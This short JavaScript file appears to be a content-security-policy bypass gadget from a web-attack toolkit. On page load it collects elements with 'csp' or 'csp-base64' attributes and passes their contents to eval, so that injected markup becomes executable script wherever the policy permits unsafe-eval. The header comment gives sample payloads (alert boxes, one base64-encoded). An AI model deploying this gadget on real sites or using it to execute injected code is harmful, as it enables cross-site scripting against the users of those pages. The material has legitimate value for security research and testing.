/*
	Classic scenario where you can just inject in the DOM wihtout any kind of restriction.
	Condition needed: unsafe-eval

	This will look for any element with the attribute CSP and evaluate it.

	Example:
	- <a csp="alert(1)"></a>
	- <a csp-base64="YWxlcnQoJzInKQ=="></a>
*/

// Trigger only onload, there is another scenario in case the injection happend afterwards
window.addEventListener("load", () => {
	let payloads = document.querySelectorAll('[csp]');
	for (let payload of payloads) {
	  eval(payload.attributes['csp'].value);
	}

	// Base 64 encoded version
	payloads = document.querySelectorAll('[csp-base64]');
	for (let payload of payloads) {
	  eval(atob(payload.attributes['csp-base64'].value));
	}
});